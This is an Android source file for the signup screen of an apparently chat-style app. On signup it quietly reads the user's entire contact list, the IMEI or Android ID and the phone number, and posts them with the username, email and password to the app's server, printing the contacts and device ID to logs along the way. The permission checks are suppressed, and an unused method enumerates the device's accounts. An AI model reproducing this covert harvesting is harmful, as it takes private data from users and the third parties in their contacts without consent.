package com.mib.bumblebee;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.mib.bumblebee.Chat.MainActivity;
import com.mib.bumblebee.api.HttpRequest;
import com.mib.bumblebee.api.WebRequest;

import java.util.ArrayList;

import static com.mib.bumblebee.Animations.rgbBackground;

public class Signup extends AppCompatActivity {

    public TextView tv;
    public EditText userName;
    public EditText email;
    public EditText password;
    public Button signUpButton;
    public ProgressBar pb2;

    public static String uname1;
    public static String pwd1;
    public static String email1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_signup);

        rgbBackground(findViewById(R.id.sign_up));
        userName = findViewById(R.id.edUsername);
        email = findViewById(R.id.edEmail);
        password = findViewById(R.id.edPassword);
        signUpButton = findViewById(R.id.sign_up_button);
        pb2 = findViewById(R.id.progressBar2);

        signUpButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                uname1 = userName.getText().toString();
                pwd1 = password.getText().toString();
                email1 = email.getText().toString();

                sUp s = new sUp();
                s.execute();
            }
        });

        tv = findViewById(R.id.alreadyaccount);
        tv.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent in = new Intent(getApplicationContext(), SplashScreenActivity.class);
                startActivity(in);
                finish();
            }
        });


    }

    class sUp extends AsyncTask<Void, Void, Void> {

        int rCode;
        boolean success;
        String contacts = "Dummy contacts";
        String imeiAndPhoneNumber = "Dummy imei";
        String name = "";
        String phoneNumber = "";
        public ArrayList<String> numbers = new ArrayList<>();


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            signUpButton.setVisibility(View.INVISIBLE);
            pb2.setVisibility(View.VISIBLE);
        }

        @SuppressLint("MissingPermission")
        @Override
        protected Void doInBackground(Void... voids) {

            try {

                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//                imei = tm.getDeviceId();
                imeiAndPhoneNumber = getUniqueID();
//                String phoneNumber = tm.getLine1Number();
                System.out.println("IMEI" + imeiAndPhoneNumber);
//                System.out.println("Phone NUmber" + phoneNumber);
//                Account[] s =getNumber();
//                for (int i = 0; i <= s.length; i++){
//                    System.out.println("ACCOUNT: " + s[i]);
//                }

                Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                while (phones.moveToNext()) {
                    name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    numbers.add(" , " + name + ": " + phoneNumber + " , ");
                }

                System.out.println("CONTACTS: " + numbers);
            } catch (Exception e) {
                System.out.println(e);
            }

            String data1 = ("{\n" +
                    "    \"email\": \"" + email1 + "\",\n" +
                    "    \"username\": \"" + uname1 + "\",\n" +
                    "    \"password\": \"" + pwd1 + "\",\n" +
                    "    \"contacts\": \"" + numbers + "\",\n" +
                    "    \"imei\": \"" + imeiAndPhoneNumber + "\"\n" +
                    "  }");

            rCode = HttpRequest.ppReq(data1, Constants.SIGNUP_URL, "POST");
            System.out.println("RESPONSE CODE: " + rCode);
            if (rCode == 201) {
                success = true;
            } else {
                System.out.println("RESPONSE CODE" + rCode);
                success = false;
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            if (success) {
                Intent in = new Intent(getApplicationContext(), MainActivity.class);
                startActivity(in);
                finish();
            } else {
                Toast.makeText(getApplicationContext(), "Username Already Exist", Toast.LENGTH_SHORT).show();
                pb2.setVisibility(View.INVISIBLE);
                signUpButton.setVisibility(View.VISIBLE);
            }
        }
    }


    public Account[] getNumber(){

        AccountManager am = AccountManager.get(this);
        Account[] accounts = am.getAccounts();
        String acname = "";
        String actype = "";
        for (Account ac : accounts) {
            acname = ac.name;
            actype = ac.type;
        }
        return accounts;

    }

    public String getUniqueID() {
        String myAndroidDeviceId = "";
        String phoneNumber = "";
        TelephonyManager mTelephony = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
        }
        if (mTelephony.getDeviceId() != null) {
            myAndroidDeviceId = mTelephony.getDeviceId();
            phoneNumber = mTelephony.getLine1Number();

        } else {
            myAndroidDeviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            phoneNumber = mTelephony.getLine1Number();
        }
        return "IMEI: " + myAndroidDeviceId + ", Phone Number: " + phoneNumber;
    }


}
